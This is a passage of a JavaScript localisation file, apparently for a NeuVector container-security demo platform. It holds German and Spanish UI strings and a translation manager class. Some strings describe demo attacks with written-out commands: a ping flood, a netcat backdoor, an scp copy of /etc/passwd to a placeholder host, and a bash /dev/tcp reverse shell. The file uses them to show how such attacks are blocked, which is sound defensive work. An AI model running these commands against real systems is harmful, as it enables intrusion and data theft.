        'admission.refreshState': 'Status aktualisieren',
        'admission.status': 'Status',
        'admission.mode': 'Modus',
        'admission.rules': 'Zugangsregeln',
        'admission.noRules': 'Keine Zugangsregeln',
        'admission.errorLoadingRules': 'Fehler beim Laden der Regeln',
        'admission.noDescription': 'Keine Beschreibung',
        'admission.enabled': 'Aktiviert',
        'admission.disabled': 'Deaktiviert',
        'admission.creatingPod': 'Pod wird erstellt...',
        'admission.deletingPod': 'Pod wird gelöscht...',
        'admission.checkingPod': 'Pod wird geprüft...',

        'alert.selectImage': 'Bitte wählen Sie eine Bilddatei',
        'alert.imageTooLarge': 'Das Bild muss kleiner als 500 KB sein',
        'alert.failedSaveLogo': 'Logo konnte nicht gespeichert werden. Das Bild ist möglicherweise zu groß.',

        'complete.success': '[FERTIG] Vorgang erfolgreich abgeschlossen',
        'complete.failed': '[FEHLGESCHLAGEN]',
        'complete.connectionFailed': 'Verbindung fehlgeschlagen',

        'tooltip.networkPolicy': 'Netzwerkrichtlinie steuert den Netzwerkverkehr zwischen Containern.\n\n• Discover: Alle Verbindungen lernen und erlauben\n• Monitor: Alles erlauben, Verstöße protokollieren\n• Protect: Nicht autorisierte Verbindungen blockieren',
        'tooltip.processProfile': 'Prozessprofil steuert, welche Prozesse in Containern laufen dürfen.\n\n• Discover: Alle Prozesse lernen und erlauben\n• Monitor: Alles erlauben, Verstöße protokollieren\n• Protect: Nicht autorisierte Prozesse blockieren (SIGKILL)',
        'tooltip.baseline': 'Baseline bestimmt, wie Prozessregeln generiert werden.\n\n• zero-drift: Nur Prozesse aus dem Originalimage erlaubt\n• basic: Im Discover-Modus gelernte Prozesse erlauben',
        'tooltip.allowedProcesses': 'Liste der erlaubten Prozesse in diesem Container.\n\nIm Protect-Modus wird jeder Prozess, der nicht in dieser Liste steht, beendet (SIGKILL, Exit-Code 137).',
        'tooltip.networkProtect': 'Netzwerkrichtlinie: Protect',
        'tooltip.networkMonitor': 'Netzwerkrichtlinie: Monitor',
        'tooltip.networkDiscover': 'Netzwerkrichtlinie: Discover',
        'tooltip.processProtect': 'Prozessprofil: Protect',
        'tooltip.processMonitor': 'Prozessprofil: Monitor',
        'tooltip.processDiscover': 'Prozessprofil: Discover',

        'cmd.httpRequest': 'HTTP-Anfrage',
        'cmd.icmpPing': 'ICMP-Ping',
        'cmd.sshConnection': 'SSH-Verbindung',
        'cmd.portScan': 'Portscan',
        'cmd.sendDlpData': 'DLP-Testdaten senden',

        'attack.dosTitle': 'DoS-Ping-Flood',
        'attack.dosDesc': '<strong>DoS-Ping-Flood</strong> - Sendet übergroße ICMP-Pakete (40KB), um das Ziel zu überfluten. Befehl: <code>ping -s 40000 -c 5 &lt;target&gt;</code>.<br><em>Bei erfolgreichem Angriff:</em> Das Ziel wird überflutet, Dienste werden unerreichbar (Denial of Service).<br><em>Schutz:</em> Von NeuVector über Netzwerkregeln blockiert, wenn ICMP-Verkehr nicht erlaubt ist.',
        'attack.backdoorDesc': '<strong>NC Backdoor</strong> - Öffnet einen Listening-Port mit Netcat, um eine Backdoor zu erstellen. Befehl: <code>nc -l 4444</code>.<br><em>Bei erfolgreichem Angriff:</em> Ein Angreifer kann sich mit Port 4444 verbinden und Shell-Zugriff auf den kompromittierten Container erhalten.<br><em>Schutz:</em> Von NeuVector im Protect-Modus blockiert, da der <code>nc</code>-Prozess nicht im autorisierten Profil ist.',
        'attack.scpDesc': '<strong>SCP-Transfer</strong> - Versucht, eine sensible Datei (/etc/passwd) an ein Remote-Ziel zu übertragen. Befehl: <code>scp /etc/passwd root@&lt;target&gt;:/tmp/</code>.<br><em>Bei erfolgreichem Angriff:</em> Exfiltration sensibler Daten (Anmeldedaten, Konfigurationen) an einen vom Angreifer kontrollierten Server.<br><em>Schutz:</em> Von NeuVector über Netzwerkregeln oder Prozessprofil blockiert.',
        'attack.shellDesc': '<strong>Reverse Shell</strong> - Versucht, eine umgekehrte Shell-Verbindung zu einem Angreifer herzustellen. Befehl: <code>bash -i &gt;&amp; /dev/tcp/&lt;target&gt;/4444 0&gt;&amp;1</code>.<br><em>Bei erfolgreichem Angriff:</em> Der Angreifer erhält vollen interaktiven Shell-Zugriff auf den Container.<br><em>Schutz:</em> Von NeuVector im Protect-Modus blockiert, da es ein nicht autorisierter Prozess ist.',
        'attack.dosFlood': 'DoS-Ping-Flood (40KB Payload)',
        'attack.ncBackdoor': 'NC Backdoor (Netcat-Listener)',
        'attack.fileTransfer': 'Dateitransfer (scp)',
        'attack.reverseShell': 'Reverse Shell',

        'lang.en': 'English',
        'lang.fr': 'Français',
        'lang.de': 'Deutsch',
        'lang.es': 'Español',
    },

    es: {
        'header.title': 'NeuVector Demo Platform',
        'header.openMenu': 'Abrir menú',
        'header.closeMenu': 'Cerrar menú',
        'header.toggleConsole': 'Mostrar/Ocultar consola',
        'header.parameters': 'Parámetros',
        'header.connecting': 'Conectando...',
        'header.connected': 'Conectado',
        'header.disconnected': 'Desconectado',
        'header.k8s': 'K8s:',
        'header.nvApi': 'NV API:',

        'sidebar.demos': 'Demos',
        'sidebar.selectDemo': 'Seleccione una demo del menú',

        'btn.runDemo': 'Ejecutar demo',
        'btn.prepare': 'Preparar',
        'btn.status': 'Estado',
        'btn.reset': 'Reiniciar',
        'btn.resetRules': 'Reiniciar reglas',
        'btn.testConnection': 'Probar conexión',
        'btn.debugCredentials': 'Depurar credenciales',
        'btn.saveClose': 'Guardar y cerrar',
        'btn.testRegistry': 'Probar registro',
        'btn.runAllChecks': 'Ejecutar todas las pruebas',
        'btn.uploadImage': 'Subir imagen',
        'btn.remove': 'Eliminar',
        'btn.clear': 'Limpiar',
        'btn.createPod': 'Crear pod',
        'btn.deletePod': 'Eliminar pod',
        'btn.checkStatus': 'Verificar estado',
        'btn.runDlpTest': 'Ejecutar prueba DLP',

        'settings.title': 'Parámetros',
        'settings.tab.preparation': 'Preparación',
        'settings.tab.credentials': 'Credenciales',
        'settings.tab.troubleshoot': 'Diagnóstico',
        'settings.tab.cosmetics': 'Apariencia',

        'settings.platformActions': 'Acciones de plataforma',
        'settings.neuVectorActions': 'Acciones NeuVector',
        'settings.imageRegistry': 'Registro de imágenes',
        'settings.registryUrl': 'URL del registro',
        'settings.registryHelp1': 'Utilizado para pods de prueba de Admission Control.',
        'settings.registryHelp2': '<strong>localhost</strong> - Imágenes locales (imagePullPolicy: Never)',
        'settings.registryHelp3': '<strong>registry.example.com/project</strong> - Registro privado (imagePullPolicy: IfNotPresent)',
        'settings.prepare.title': 'Desplegar namespace y pods de demo',
        'settings.status.title': 'Verificar estado de la plataforma',
        'settings.reset.title': 'Eliminar todos los recursos de demo',
        'settings.resetRules.title': 'Restablecer espion1 y cible1 a modo Discover, baseline zero-drift y borrar reglas de procesos',

        'settings.neuVectorApi': 'API NeuVector',
        'settings.username': 'Usuario',
        'settings.password': 'Contraseña',
        'settings.apiUrl': 'URL de la API',
        'settings.apiUrlHelp': 'Dejar vacío para usar la URL predeterminada',
        'settings.enterPassword': 'Introducir contraseña',

        'settings.diagnostics': 'Diagnósticos',
        'settings.checking': 'Verificando...',
        'settings.running': 'Ejecutando...',

        'diag.infrastructure': 'Infraestructura',
        'diag.environment': 'Entorno',
        'diag.nvConfig': 'Configuración NeuVector',
        'diag.kubernetes': 'Clúster Kubernetes',
        'diag.neuVectorApi': 'API NeuVector',
        'diag.demoNamespace': 'Namespace de demo',
        'diag.demoPods': 'Pods de demo',
        'diag.nvGroups': 'Grupos NeuVector',
        'diag.processProfiles': 'Perfiles de procesos',
        'diag.dlpSensors': 'Sensores DLP',
        'diag.admissionControl': 'Control de admisión',
        'diag.passed': 'pasadas',

        'settings.appearance': 'Apariencia',
        'settings.language': 'Idioma',
        'settings.pageTitle': 'Título de la página',
        'settings.logo': 'Logo',
        'settings.noLogo': 'Sin logo',
        'settings.about': 'Acerca de',
        'settings.version': 'Versión:',
        'settings.git': 'Git:',
        'settings.loading': 'Cargando...',
        'settings.error': 'Error',
        'settings.unknown': 'Desconocido',

        'console.title': 'Consola de salida',
        'console.welcome': '[INFO] Bienvenido a NeuVector Demo Platform',
        'console.selectDemo': '[INFO] Seleccione una demo del menú para comenzar',

        'status.testingConnection': 'Probando conexión...',
        'status.connectionSuccess': '¡Conexión exitosa!',
        'status.connectionFailed': 'Conexión fallida:',
        'status.enterPassword': 'Por favor, introduzca una contraseña',
        'status.testingRegistry': 'Probando registro...',
        'status.resettingRules': 'Reiniciando reglas...',
        'status.enterNvPassword': 'Primero introduzca la contraseña de NeuVector',
        'status.failedSave': 'Error al guardar la configuración',
        'status.disconnected': 'Desconectado',

        'cluster.disconnected': 'Desconectado',
        'cluster.error': 'Error',

        'viz.source': 'Origen',
        'viz.target': 'Destino',
        'viz.attacker': 'Atacante',
        'viz.ready': 'Listo',
        'viz.readySelectAttack': 'Listo - Seleccione un tipo de ataque',
        'viz.connecting': 'Conectando...',
        'viz.connectionSuccessful': 'Conexión exitosa',
        'viz.networkBlocked': 'Red bloqueada por política',
        'viz.processBlocked': 'Proceso bloqueado por SUSE Security',
        'viz.attackBlocked': 'Ataque bloqueado por SUSE Security',
        'viz.attackSucceeded': 'Ataque exitoso - considere activar el modo Protect',
        'viz.dataSentDlp': 'Datos enviados (DLP en modo Alert - verifique los logs de NeuVector)',
        'viz.httpSuccess': 'Solicitud HTTP exitosa',
        'viz.pingSuccess': 'Ping exitoso',
        'viz.portScanComplete': 'Escaneo de puertos completado',
        'viz.commandSuccess': 'Comando ejecutado con éxito',
        'viz.connectionBlockedTimeout': 'Conexión bloqueada (tiempo agotado)',
        'viz.runningAttack': 'Simulación de ataque en curso...',

        'viz.networkPolicy': 'Política de red',
        'viz.processProfile': 'Perfil de proceso',
        'viz.baseline': 'Línea base',
        'viz.allowedProcesses': 'Procesos permitidos',
        'viz.dataType': 'Tipo de datos',
        'viz.customData': 'Datos personalizados',
        'viz.enterData': 'Introducir datos...',
        'viz.dlpSensors': 'Sensores DLP',
        'viz.refreshSensors': 'Actualizar sensores',
        'viz.loadingSensors': 'Cargando sensores...',
        'viz.noDlpSensors': 'No hay sensores DLP configurados',
        'viz.hostnameIp': 'nombre de host/IP',

        'events.suseSecurityEvents': 'Eventos SUSE Security',
        'events.admissionEvents': 'Eventos de admisión',
        'events.clickRefresh': 'Haga clic en actualizar para cargar eventos',
        'events.clearEvents': 'Borrar eventos',
        'events.refreshEvents': 'Actualizar eventos',
        'events.loading': 'Cargando...',
        'events.configureCredentials': 'Configure primero las credenciales de SUSE Security',
        'events.noRecentEvents': 'No hay eventos recientes',
        'events.noNewEvents': 'No hay nuevos eventos desde el borrado',
        'events.eventsCleared': 'Eventos borrados - mostrando solo nuevos eventos',
        'events.noAdmissionEvents': 'No hay eventos de admisión',
        'events.errorLoading': 'Error al cargar eventos',

        'process.loading': 'Cargando...',
        'process.noRules': 'Sin reglas de proceso',
        'process.noProcessRules': 'Sin reglas',
        'process.errorLoading': 'Error al cargar reglas',
        'process.error': 'Error',
        'process.notConfigured': 'No configurado',
        'process.deleteRule': 'Eliminar esta regla',
        'process.delete': 'Eliminar',

        'viz.networkRules': 'Reglas de red',
        'viz.networkRulesWarning': 'Las reglas aprendidas permiten tráfico en modo Protect',
        'network.noRules': 'Sin reglas de red',
        'network.deleteRule': 'Eliminar esta regla de red',
        'network.ingress': 'IN',
        'network.egress': 'OUT',
        'network.both': 'AMBOS',

        'warning.discoverMode': '[WARNING] La política de red está en modo Discover — los ataques NO serán bloqueados. Cambie a Protect para demostrar el bloqueo.',
        'status.syncing': 'Sincronizando con NeuVector...',

        'admission.controlTest': 'Prueba de control de admisión',
        'admission.targetNamespace': 'Namespace destino',
        'admission.podName': 'Nombre del pod',
        'admission.controlState': 'Estado del control de admisión',
        'admission.refreshState': 'Actualizar estado',
        'admission.status': 'Estado',
        'admission.mode': 'Modo',
        'admission.rules': 'Reglas de admisión',
        'admission.noRules': 'Sin reglas de admisión',
        'admission.errorLoadingRules': 'Error al cargar reglas',
        'admission.noDescription': 'Sin descripción',
        'admission.enabled': 'Habilitado',
        'admission.disabled': 'Deshabilitado',
        'admission.creatingPod': 'Creando pod...',
        'admission.deletingPod': 'Eliminando pod...',
        'admission.checkingPod': 'Verificando pod...',

        'alert.selectImage': 'Por favor, seleccione un archivo de imagen',
        'alert.imageTooLarge': 'La imagen debe ser menor de 500 KB',
        'alert.failedSaveLogo': 'Error al guardar el logo. La imagen puede ser demasiado grande.',

        'complete.success': '[HECHO] Operación completada con éxito',
        'complete.failed': '[FALLIDO]',
        'complete.connectionFailed': 'Conexión fallida',

        'tooltip.networkPolicy': 'La política de red controla el tráfico entre contenedores.\n\n• Discover: Aprender y permitir todas las conexiones\n• Monitor: Permitir todo, registrar violaciones\n• Protect: Bloquear conexiones no autorizadas',
        'tooltip.processProfile': 'El perfil de proceso controla qué procesos pueden ejecutarse.\n\n• Discover: Aprender y permitir todos los procesos\n• Monitor: Permitir todo, registrar violaciones\n• Protect: Bloquear procesos no autorizados (SIGKILL)',
        'tooltip.baseline': 'La línea base determina cómo se generan las reglas de proceso.\n\n• zero-drift: Solo se permiten procesos de la imagen original\n• basic: Permitir procesos aprendidos en modo Discover',
        'tooltip.allowedProcesses': 'Lista de procesos permitidos en este contenedor.\n\nEn modo Protect, cualquier proceso que no esté en esta lista será eliminado (SIGKILL, código de salida 137).',
        'tooltip.networkProtect': 'Política de red: Protect',
        'tooltip.networkMonitor': 'Política de red: Monitor',
        'tooltip.networkDiscover': 'Política de red: Discover',
        'tooltip.processProtect': 'Perfil de proceso: Protect',
        'tooltip.processMonitor': 'Perfil de proceso: Monitor',
        'tooltip.processDiscover': 'Perfil de proceso: Discover',

        'cmd.httpRequest': 'Solicitud HTTP',
        'cmd.icmpPing': 'Ping ICMP',
        'cmd.sshConnection': 'Conexión SSH',
        'cmd.portScan': 'Escaneo de puertos',
        'cmd.sendDlpData': 'Enviar datos de prueba DLP',

        'attack.dosTitle': 'Inundación Ping DoS',
        'attack.dosDesc': '<strong>Inundación Ping DoS</strong> - Envía paquetes ICMP sobredimensionados (40KB) para inundar el objetivo. Comando: <code>ping -s 40000 -c 5 &lt;target&gt;</code>.<br><em>Si el ataque tiene éxito:</em> El objetivo se satura, los servicios dejan de estar disponibles (denegación de servicio).<br><em>Protección:</em> Bloqueado por NeuVector a través de reglas de red si el tráfico ICMP no está permitido.',
        'attack.backdoorDesc': '<strong>NC Backdoor</strong> - Abre un puerto de escucha con netcat para crear una puerta trasera. Comando: <code>nc -l 4444</code>.<br><em>Si el ataque tiene éxito:</em> Un atacante puede conectarse al puerto 4444 y obtener acceso shell al contenedor comprometido.<br><em>Protección:</em> Bloqueado por NeuVector en modo Protect ya que el proceso <code>nc</code> no está en el perfil autorizado.',
        'attack.scpDesc': '<strong>Transferencia SCP</strong> - Intenta transferir un archivo sensible (/etc/passwd) a un destino remoto. Comando: <code>scp /etc/passwd root@&lt;target&gt;:/tmp/</code>.<br><em>Si el ataque tiene éxito:</em> Exfiltración de datos sensibles (credenciales, configuraciones) a un servidor controlado por el atacante.<br><em>Protección:</em> Bloqueado por NeuVector a través de reglas de red o perfil de proceso.',
        'attack.shellDesc': '<strong>Reverse Shell</strong> - Intenta establecer una conexión shell inversa con un atacante. Comando: <code>bash -i &gt;&amp; /dev/tcp/&lt;target&gt;/4444 0&gt;&amp;1</code>.<br><em>Si el ataque tiene éxito:</em> El atacante obtiene acceso shell interactivo completo al contenedor.<br><em>Protección:</em> Bloqueado por NeuVector en modo Protect ya que es un proceso no autorizado.',
        'attack.dosFlood': 'Inundación Ping DoS (payload 40KB)',
        'attack.ncBackdoor': 'NC Backdoor (listener netcat)',
        'attack.fileTransfer': 'Transferencia de archivo (scp)',
        'attack.reverseShell': 'Reverse Shell',

        'lang.en': 'English',
        'lang.fr': 'Français',
        'lang.de': 'Deutsch',
        'lang.es': 'Español',
    }
};

/**
 * I18n manager - handles language selection and translation
 */
class I18n {
    constructor() {
        this.currentLang = localStorage.getItem(I18N_STORAGE_KEY) || 'en';
        // Validate language
        if (!translations[this.currentLang]) {
            this.currentLang = 'en';
        }
    }

    /**
     * Get translation for a key
     */
    t(key) {
        const lang = translations[this.currentLang];
        if (lang && lang[key] !== undefined) {
            return lang[key];
        }
        // Fallback to English
        const en = translations.en;
        if (en && en[key] !== undefined) {
            return en[key];
        }
        // Return key as fallback
        return key;
    }

    /**
     * Get current language code
     */
    getLang() {
        return this.currentLang;
    }

    /**
     * Set language and persist
     */
    setLang(lang) {
        if (!translations[lang]) return;
        this.currentLang = lang;
        localStorage.setItem(I18N_STORAGE_KEY, lang);
        this.applyTranslations();
    }

    /**
     * Apply translations to all elements with data-i18n attribute
     */
    applyTranslations() {
        // Translate text content
        document.querySelectorAll('[data-i18n]').forEach(el => {
            const key = el.getAttribute('data-i18n');
            const translated = this.t(key);
            el.textContent = translated;
        });

        // Translate innerHTML (for elements with HTML content)
        document.querySelectorAll('[data-i18n-html]').forEach(el => {
            const key = el.getAttribute('data-i18n-html');
            const translated = this.t(key);
            el.innerHTML = translated;
        });

        // Translate placeholders
        document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
            const key = el.getAttribute('data-i18n-placeholder');
            el.placeholder = this.t(key);
        });

        // Translate titles (tooltips)
        document.querySelectorAll('[data-i18n-title]').forEach(el => {
            const key = el.getAttribute('data-i18n-title');
            el.title = this.t(key);
        });

        // Update HTML lang attribute
        document.documentElement.lang = this.currentLang;
    }

    /**
     * Get available languages
     */
    getAvailableLanguages() {
        return Object.keys(translations);
    }
}

// Global i18n instance
const i18n = new I18n();

/**
 * Shortcut translation function
 */
function t(key) {
    return i18n.t(key);
}
